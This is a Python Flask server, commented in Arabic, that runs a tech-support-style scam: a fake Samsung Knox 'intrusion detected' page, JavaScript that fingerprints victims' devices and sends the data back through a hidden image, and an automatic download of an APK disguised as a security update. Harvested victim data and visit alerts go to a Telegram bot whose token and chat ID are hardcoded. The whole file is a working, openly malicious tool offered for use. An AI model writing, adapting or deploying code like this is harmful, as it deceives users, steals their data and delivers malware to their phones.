# server.py - خادم الوسيط الخبيث
from flask import Flask, request, render_template_string, send_file
import os
import json
import requests
from datetime import datetime

app = Flask(__name__)

# رابط بوت التليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "8019187442:AAHTk58jSJpGHGduzUcMANIm-89yjqI15AY"
TELEGRAM_CHAT_ID = "936456904"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"

# HTML لصفحة الخداع (سيتم تحسينها)
DECEPTION_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>تحذير أمني خطير!</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background: black; color: red; text-align: center; padding: 50px; }
        .warning { border: 3px solid red; padding: 20px; border-radius: 10px; background: #111; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.3; } }
    </style>
</head>
<body>
    <div class="warning">
        <h1 class="blink">⚠️ تحذير: تم اكتشاف عملية اختراق! ⚠️</h1>
        <h2>تم رصد محاولة وصول غير مصرح بها إلى جهازك (Samsung Galaxy).</h2>
        <p>يبدو أن هكرًا من الصين (IP: 112.85.42.17) قد اخترق نظامك.</p>
        <p><strong>نقترح بشدة:</strong></p>
        <ol style="text-align: left; display: inline-block;">
            <li>إغلاق جميع التطبيقات.</li>
            <li>تشغيل وضع الطائرة فورًا.</li>
            <li>الذهاب إلى الإعدادات > الأمان > مصدات الأمان ومسح البيانات.</li>
            <li>الاتصال بدعم Verizon على 611.</li>
        </ol>
        <br>
        <p style="color: #ccc;">هذه الرسالة تظهر كجزء من نظام حماية Samsung Knox.</p>
        <p style="font-size: 0.8em; color: #888;">REF: SEC_INTRUSION_ALERT_#{{ alert_id }}</p>
    </div>
    <!-- ستقوم الخلفية بتحميل الحمولة الخبيثة بشكل غير مرئي -->
</body>
</html>
"""

@app.route('/')
def index():
    """تقدم صفحة الخداع للضحية."""
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # تسجيل معلومات الزيارة
    log_entry = f"[{datetime.now()}] زيارة من IP: {victim_ip} | User-Agent: {user_agent}\n"
    with open("visits.log", "a") as f:
        f.write(log_entry)
    
    # إرسال تنبيه سريع للتليجرام
    alert_msg = f"🎣 ضحية محتملة دخلت الرابط!\nIP: {victim_ip}\nDevice: {user_agent[:100]}"
    send_to_telegram(alert_msg)
    
    return render_template_string(DECEPTION_PAGE_HTML, alert_id=os.urandom(4).hex())

@app.route('/payload')
def deliver_payload():
    """تسليم الحمولة الخبيثة (سكريبت JS مع صلاحيات متقدمة)."""
    # يمكن هنا تسليم ملف APK مخفي، أو سكريبت استغلال
    # في هذه المرحلة، سنقدم سكريبت JavaScript متقدم
    malicious_js = """
    // حمولة JS متقدمة لجمع البيانات
    (function(){
        // جمع البيانات الأساسية
        var data = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {width: screen.width, height: screen.height},
            cookiesEnabled: navigator.cookieEnabled,
            // محاولة الحصول على IP عبر خدمة خارجية
        };
        
        // محاولة الوصول إلى البطارية API (إن وجد)
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                data.battery = {
                    level: battery.level * 100 + "%",
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
                sendData(data);
            });
        } else {
            sendData(data);
        }
        
        function sendData(payload) {
            // إرسال البيانات إلى نقطة جمع على الخادم
            var formData = new FormData();
            formData.append('victim_data', JSON.stringify(payload));
            
            // صورة خفية لجمع الـ IP الحقيقي
            var img = new Image();
            img.src = '/collect?data=' + encodeURIComponent(JSON.stringify(payload));
            img.style.display = 'none';
            document.body.appendChild(img);
        }
        
        // استغلال ثغرة محتملة في WebView لتنزيل ملف APK مخفي
        setTimeout(function(){
            // رابط لتنزيل APK مخفي كـ "تحديث أمني"
            var hiddenLink = document.createElement('a');
            hiddenLink.href = '/download/security_update.apk'; // سيكون ملف APK مخفي هنا
            hiddenLink.download = 'Security_Update_Samsung.apk';
            hiddenLink.click();
        }, 5000); // بعد 5 ثواني من تحميل الصفحة
    })();
    """
    return malicious_js, 200, {'Content-Type': 'application/javascript'}

@app.route('/collect')
def collect_data():
    """نقطة نهاية لجمع البيانات من الضحايا."""
    victim_data = request.args.get('data', '{}')
    victim_ip = request.remote_addr
    
    try:
        data_obj = json.loads(victim_data)
        data_obj['real_ip'] = victim_ip
        data_obj['timestamp'] = str(datetime.now())
        
        # حفظ البيانات محليًا
        with open(f"victim_data_{victim_ip}.json", "w") as f:
            json.dump(data_obj, f, indent=2)
        
        # إرسال البيانات إلى التليجرام
        message = f"🕵️ بيانات جديدة مسروقة 🕵️\nمن IP: {victim_ip}\n"
        for key, value in data_obj.items():
            message += f"\n{key}: {value}"
        
        send_to_telegram(message[:4000])  # الحد الأقصى لرسالة التليجرام
        
    except Exception as e:
        print(f"خطأ في جمع البيانات: {e}")
    
    return "OK", 200

def send_to_telegram(message):
    """دالة مساعدة لإرسال رسائل إلى بوت التليجرام."""
    try:
        url = TELEGRAM_API_URL + "sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"فشل في إرسال رسالة التليجرام: {e}")

if __name__ == '__main__':
    # تشغيل الخادم على منفذ 8080 (يمكن تغييره)
    app.run(host='0.0.0.0', port=8080, debug=False)
